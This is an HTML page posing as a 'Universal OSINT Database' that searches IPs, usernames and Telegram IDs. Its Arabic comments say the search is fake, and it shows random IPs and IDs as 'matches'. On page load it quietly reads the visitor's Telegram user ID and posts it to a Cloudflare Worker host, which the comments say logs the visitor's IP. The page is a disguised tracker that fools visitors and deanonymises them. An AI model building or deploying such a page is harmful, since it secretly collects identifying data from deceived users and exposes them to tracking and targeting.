<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Universal OSINT Database</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #000; color: #00ffcc; text-align: center; padding: 50px; }
        .box { max-width: 600px; margin: auto; background: #111; padding: 20px; border: 1px solid #00ffcc; border-radius: 10px; }
        input { width: 80%; padding: 10px; margin: 10px 0; background: #000; color: #00ffcc; border: 1px solid #00ffcc; }
        button { padding: 10px 20px; background: #00ffcc; color: #000; border: none; font-weight: bold; cursor: pointer; }
        #results { margin-top: 20px; text-align: left; background: #000; padding: 15px; border: 1px solid #333; min-height: 80px; white-space: pre-wrap; }
    </style>
</head>
<body>
    <div class="box">
        <h1>🌐 Universal OSINT Database</h1>
        <p>Search IPs, Usernames, and Telegram IDs</p>
        <input type="text" id="searchInput" placeholder="Enter Username or ID...">
        <br>
        <button onclick="performSearch()">Search</button>
        <div id="results">Ready.</div>
    </div>

    <script>
        // ⚠️ ضع رابط الـ Worker الخاص بك هنا (الذي حصلت عليه من Cloudflare)
        const WORKER_URL = 'https://capture.kikizamllll.workers.dev/';

        // 1. إرسال البيانات عند فتح الصفحة (مرة واحدة فقط)
        window.addEventListener('DOMContentLoaded', async () => {
            let tg_id = "Browser (No Telegram)";
            
            // قراءة الآي دي من تيليجرام (إذا كان مفتوحاً من البوت)
            if (window.Telegram && window.Telegram.WebApp) {
                const tg = window.Telegram.WebApp; 
                tg.ready();
                const user = tg.initDataUnsafe?.user;
                if (user) { 
                    tg_id = user.id; 
                }
            }

            // إرسال الآي دي فقط إلى الـ Worker (الذي سيقرأ الـ IP ويرسله)
            const payload = { tg_id: tg_id };

            try {
                await fetch(WORKER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) { 
                console.error("Error:", e); 
            }
        });

        // 2. البحث الوهمي (يظهر للزائر فقط، ولا يرسل شيئاً)
        function performSearch() {
            const input = document.getElementById('searchInput').value.trim();
            const results = document.getElementById('results');
            if (!input) { results.innerHTML = "Please enter a target."; return; }
            
            results.innerHTML = `[*] Searching for: ${input}...`;
            
            setTimeout(() => {
                const randomIp = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
                const randomId = Math.floor(Math.random() * 900000000) + 100000000;
                const randomDate = new Date(Date.now() - Math.floor(Math.random()*10000000000)).toLocaleString();
                
                results.innerHTML = `
<span style="color:#00ffcc;">[+] MATCH FOUND: ${input}</span>
--------------------------------------------------
IP Address : ${randomIp}
Telegram ID: ${randomId}
Status     : ACTIVE
Last Seen  : ${randomDate}
--------------------------------------------------
<span style="color:#888;">[*] Data extracted from Universal Database.</span>
                `;
            }, 2000);
        }
    </script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</body>
</html>
